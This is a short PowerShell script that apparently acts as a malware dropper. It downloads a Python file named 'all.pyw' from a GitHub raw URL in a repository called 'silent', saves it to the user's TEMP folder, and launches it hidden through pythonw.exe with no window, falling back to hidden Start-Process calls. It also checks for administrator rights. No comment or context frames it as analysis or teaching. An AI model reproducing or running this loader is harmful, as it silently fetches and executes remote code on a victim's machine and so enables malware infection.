$tmp = Join-Path $env:TEMP 'all.pyw'
try {
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
} catch {
    $isAdmin = $false
}
try {
    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Paladu13/silent/main/all.pyw' -OutFile $tmp -UseBasicParsing
} catch {
    exit
}
try {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = 'pythonw.exe'
    $psi.Arguments = '"' + $tmp + '"'
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    $psi.WindowStyle = 'Hidden'
    [System.Diagnostics.Process]::Start($psi) > $null
} catch {
    try { Start-Process -FilePath $tmp -WindowStyle Hidden }
    catch { Start-Process -FilePath $tmp }
}
exit
